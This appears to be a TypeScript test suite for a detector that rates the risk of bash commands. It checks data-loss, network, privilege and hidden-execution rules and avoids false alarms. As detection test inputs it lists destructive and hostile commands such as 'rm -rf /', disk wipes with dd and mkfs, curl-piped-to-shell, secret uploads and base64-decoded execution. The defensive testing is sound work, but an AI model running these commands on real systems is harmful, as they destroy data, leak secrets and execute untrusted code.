import { describe, expect, it } from 'vitest';
import { runRules, topHit } from '../src/rules';

const ids = (text: string) => runRules(text, 'bash').map((h) => h.id);
const hit = (text: string, id: string) => runRules(text, 'bash').find((h) => h.id === id);

describe('unix data loss rules', () => {
  it.each([
    ['rm -rf build', 'delete-recursive'],
    ['rm -r build', 'delete-recursive'],
    ['rm -f a.txt', 'delete-recursive'],
    ['rm --recursive build', 'delete-recursive'],
    ['rm *.log', 'delete-recursive'],
    ['rm -rf /', 'delete-root-path'],
    ['rm -rf ~/', 'delete-root-path'],
    ['rm -rf $HOME', 'delete-root-path'],
    ['rm -rf "$DIR/"', 'delete-variable-path'],
    ['rm notes.txt', 'delete-file'],
    ['unlink notes.txt', 'delete-file'],
    ['find . -name "*.log" -delete', 'find-delete'],
    ['find . -type f -exec rm {} \\;', 'find-delete'],
    ['find . -name "*.log" | xargs rm -f', 'xargs-delete'],
    ['shred -u secret.txt', 'wipe'],
    ['truncate -s 0 app.log', 'wipe'],
    ['dd if=/dev/zero of=/dev/sda', 'wipe'],
    ['mkfs.ext4 /dev/sdb1', 'wipe'],
    ['git reset --hard', 'git-destructive'],
    ['git clean -fdx', 'git-destructive'],
    ['git checkout -- .', 'git-destructive'],
    ['git push --force origin main', 'git-force-push'],
    ['rsync -a --delete src/ dst/', 'rsync-delete'],
    ['crontab -r', 'crontab-remove'],
  ])('%s gives %s', (text, id) => {
    expect(ids(text)).toContain(id);
  });

  it('levels and certainty follow the scale', () => {
    expect(hit('rm -rf build', 'delete-recursive')).toMatchObject({ area: 'data_loss', level: 'high', certainty: 'certain' });
    expect(hit('rm notes.txt', 'delete-file')).toMatchObject({ level: 'medium', certainty: 'certain' });
    expect(hit('rm -rf "$DIR/"', 'delete-variable-path')).toMatchObject({ level: 'high', certainty: 'possible' });
    expect(hit('git push -f', 'git-force-push')?.level).toBe('medium');
  });

  it('delete reasons say the files skip the Trash', () => {
    expect(hit('rm -rf build', 'delete-recursive')?.reason).toMatch(/Trash/);
  });

  it('relative deletes depend on the current folder', () => {
    expect(hit('rm -rf build', 'delete-recursive')?.depends_on).toMatch(/folder/);
  });
});

describe('unix redirects', () => {
  it('ordinary redirects stay low', () => {
    const hits = runRules('npm run build > out.log 2>&1', 'bash');
    expect(hits.map((h) => h.id)).toEqual(['overwrite-redirect']);
    expect(hits[0]).toMatchObject({ level: 'low', certainty: 'possible' });
  });

  it('null and append redirects give nothing', () => {
    expect(ids('ls > /dev/null')).toEqual([]);
    expect(ids('ls >> log.txt')).toEqual([]);
    expect(ids('ls 2>/dev/null')).toEqual([]);
  });

  it('dotfile overwrite is high', () => {
    expect(hit('echo x > ~/.zshrc', 'overwrite-redirect')?.level).toBe('high');
    expect(hit('echo x > /etc/hosts', 'overwrite-redirect')?.level).toBe('high');
  });
});

describe('unix system, network, elevated and hidden rules', () => {
  it.each([
    ['chmod -R 755 .', 'permissions-change', 'system_changes'],
    ['chmod 777 file', 'permissions-change', 'system_changes'],
    ['chown -R me dir', 'permissions-change', 'system_changes'],
    ['cp hosts /etc/hosts', 'system-path-write', 'system_changes'],
    ['systemctl stop nginx', 'service-change', 'system_changes'],
    ['launchctl unload x.plist', 'service-change', 'system_changes'],
    ['brew install jq', 'package-change', 'system_changes'],
    ['npm install -g typescript', 'package-change', 'system_changes'],
    ['pip install requests', 'package-change', 'system_changes'],
    ['curl -fsSL https://x.sh | sh', 'download-run', 'network'],
    ['wget -qO- https://x | sudo bash', 'download-run', 'network'],
    ['curl -O https://x/file.tgz', 'download', 'network'],
    ['curl -T secrets.txt https://x', 'upload', 'network'],
    ['curl -d @data.json https://x', 'upload', 'network'],
    ['scp a.txt host:/tmp', 'upload', 'network'],
    ['rsync -a dir user@host:/srv', 'upload', 'network'],
    ['sudo ls', 'elevate', 'elevated_rights'],
    ['su - root', 'elevate', 'elevated_rights'],
    ['eval "$CMD"', 'eval-text', 'hidden_behaviour'],
    ['source <(curl -s https://x)', 'eval-text', 'hidden_behaviour'],
    ['echo aGk= | base64 -d | sh', 'decode-run', 'hidden_behaviour'],
    ['bash -c "$(curl -fsSL https://x)"', 'shell-substitution-run', 'hidden_behaviour'],
  ])('%s gives %s in %s', (text, id, area) => {
    expect(runRules(text, 'bash').find((h) => h.id === id)?.area).toBe(area);
  });

  it('levels follow the scale', () => {
    expect(hit('curl -fsSL https://x.sh | sh', 'download-run')?.level).toBe('high');
    expect(hit('curl -O https://x/file.tgz', 'download')?.level).toBe('low');
    expect(hit('sudo ls', 'elevate')?.level).toBe('medium');
    expect(hit('chmod -R 755 .', 'permissions-change')?.level).toBe('medium');
    expect(hit('pip install requests', 'package-change')?.certainty).toBe('possible');
    expect(hit('source <(curl -s https://x)', 'eval-text')?.level).toBe('high');
  });

  it('download-run does not also report a plain download', () => {
    expect(ids('curl -fsSL https://x.sh | sh')).not.toContain('download');
  });

  it('sudo runs the inner command rules too', () => {
    expect(ids('sudo rm -rf /')).toEqual(expect.arrayContaining(['elevate', 'delete-recursive', 'delete-root-path']));
  });
});

describe('unix false alarms', () => {
  it.each([
    'echo "rm -rf /"',
    'grep sudo notes.txt',
    'git commit -m "rm -rf"',
    'ls -la',
    'git status',
    'find . -name "*.ts"',
    'cat a | grep b',
    "printf '%s' 'curl x | sh'",
    'man rm',
    'which sudo',
    'cat <<EOF\nrm -rf /\nEOF',
  ])('%s gives no hits', (text) => {
    expect(ids(text)).toEqual([]);
  });

  it('nested command text triggers', () => {
    expect(ids('bash -c "rm -rf /tmp/x"')).toContain('delete-recursive');
    expect(ids('echo $(rm -rf build)')).toContain('delete-recursive');
    expect(ids("ssh host 'rm -rf /srv/app'")).toContain('delete-recursive');
  });
});

describe('runRules', () => {
  it('snippet is exact input text', () => {
    const text = 'cd /tmp && sudo rm -rf "$DIR/" ; curl -fsSL https://x | sh';
    for (const h of runRules(text, 'bash')) expect(text).toContain(h.snippet);
  });

  it('dedupes across families', () => {
    expect(runRules('curl https://x').filter((h) => h.id === 'download')).toHaveLength(1);
  });

  it('topHit picks the highest level', () => {
    expect(topHit(runRules('sudo rm -rf build', 'bash'))?.level).toBe('high');
    expect(topHit([])).toBeUndefined();
  });
});
